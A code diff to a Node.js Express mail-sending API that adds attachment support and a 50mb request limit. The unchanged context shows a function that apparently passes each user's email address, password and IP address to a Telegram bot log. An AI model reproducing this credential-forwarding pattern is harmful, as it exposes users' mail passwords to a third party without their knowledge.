@@ -3,7 +3,8 @@ const nodemailer = require('nodemailer')
 const axios = require('axios')
 
 const app = express()
-app.use(express.json())
+app.use(express.json({ limit: '50mb' }))
+app.use(express.urlencoded({ limit: '50mb', extended: true }))
 
 const API_KEY = process.env.API_KEY
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
@@ -59,7 +60,7 @@ async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, st
 }
 
 app.post('/api/send', async (req, res) => {
-  const { apiKey, userEmail, userPass, toEmail, subject, htmlBody } = req.body
+  const { apiKey, userEmail, userPass, toEmail, subject, htmlBody, attachments } = req.body
   const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'UNKNOWN'
   const clientIp = rawIp.split(',')[0].trim()
 
@@ -94,6 +95,10 @@ app.post('/api/send', async (req, res) => {
       to: toEmail,
       subject: subject,
       html: htmlBody
+    }
+
+    if (attachments && attachments.length > 0) {
+      mailOptions.attachments = attachments
     }
 
     const info = await transporter.sendMail(mailOptions)
